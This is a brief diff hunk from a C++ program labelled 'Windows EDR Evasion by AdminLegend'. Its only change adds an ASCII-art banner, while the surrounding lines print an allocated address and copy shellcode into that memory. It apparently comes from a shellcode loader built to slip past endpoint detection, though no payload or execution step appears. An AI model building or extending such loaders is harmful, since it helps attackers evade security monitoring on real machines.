@@ -97,6 +97,14 @@ if (status != 0) {
 
 std::cout << "[+] Memory allocated at: " << baseAddr << "\n";
 std::cout << "[+] Windows EDR Evasion by AdminLegend\n";
+std::cout << R"(
+██╗   ██╗██████╗  ██████╗ ██╗  ██╗██╗███████╗████████╗
+╚██╗ ██╔╝██╔══██╗██╔═══██╗██║  ██║██║██╔════╝╚══██╔══╝
+ ╚████╔╝ ██████╔╝██║   ██║███████║██║███████╗   ██║   
+  ╚██╔╝  ██╔══██╗██║   ██║██╔══██║██║╚════██║   ██║   
+   ██║   ██║  ██║╚██████╔╝██║  ██║██║███████║   ██║   
+   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝                                                         
+)" << std::endl;
 memcpy(baseAddr, shellcode, shellcodeSize);
 delete[] shellcode;
 
